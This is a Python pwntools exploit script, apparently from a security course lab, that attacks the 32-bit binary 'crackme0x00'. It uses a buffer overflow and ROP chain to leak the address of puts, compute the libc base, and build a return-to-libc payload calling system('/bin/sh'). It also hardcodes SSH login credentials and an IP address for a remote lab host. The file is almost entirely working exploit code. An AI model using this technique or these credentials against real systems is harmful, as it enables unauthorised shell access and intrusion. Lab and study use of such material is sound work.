#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import re

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './crackme0x00'
myUser = 'lab08'
myIP = '52.201.10.159'
myPass = '6009484c'
myCwd = '/home/lab08/tut08-reliable-01'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    print args
    '''Start the exploit against the target.'''
    '''
    '''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        s = ssh(myUser, myIP, password=myPass)
        return s.process([exe] + argv, cwd=myCwd)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b start
continue
'''.format(**locals())

def getLibcPath():
    p = process('ldd ' + exe, shell=True)
    ldd = parse_ldd_output(p.recvall())
    for key in ldd:
        x = re.search('libc', key)
        if (x):
            break
    return key

elf = ELF(exe)
libc = ELF(getLibcPath())

# ropper --file ./crackme0x00 --search "pop %;"
pop1 = 0x0804872b #: pop ebp; ret;
pop2 = 0x0804872a #: pop edi; pop ebp; ret;
pop3 = 0x08048729 #: pop esi; pop edi; pop ebp; ret;
pop4 = 0x08048728 #: pop ebx; pop esi; pop edi; pop ebp; ret;

padding = cyclic(cyclic_find(0x6161616c))

def getBase(leakedFunc):
    rop = ROP(elf)
    rop.raw(elf.plt[leakedFunc])
    rop.raw(pop1)
    rop.raw(elf.got[leakedFunc])
    rop.raw(elf.symbols['start'])
    rop.raw(0xdeadbeef)
    payload = padding + rop.chain()
    io.sendline(payload)
    print io.recvline() # IOLI Crackme Level 0x00
    print io.recvline() # Password:Invalid Password!
    encodedVal = io.recvline()
    binString = encodedVal.ljust(32, '0')
    packedBinString = hex(unpack(binString, 'all', endian='little', sign=False))
    lenPackedBinString = len(packedBinString)
    unpackedStringAddr = packedBinString[lenPackedBinString-8:lenPackedBinString]
    leak = int(unpackedStringAddr, 16)  & 0xffffffff
    base = leak - libc.symbols[leakedFunc]
    return base

def exploit(base):
    libc.address = base
    rop = ROP(libc)
    rop.system(next(libc.search('/bin/sh\x00')))
    rop.exit()
    return rop.chain()

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


io = start()
base = getBase('puts')
print hex(base)
exit()

payload = padding + exploit(base)
io.sendline(payload)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

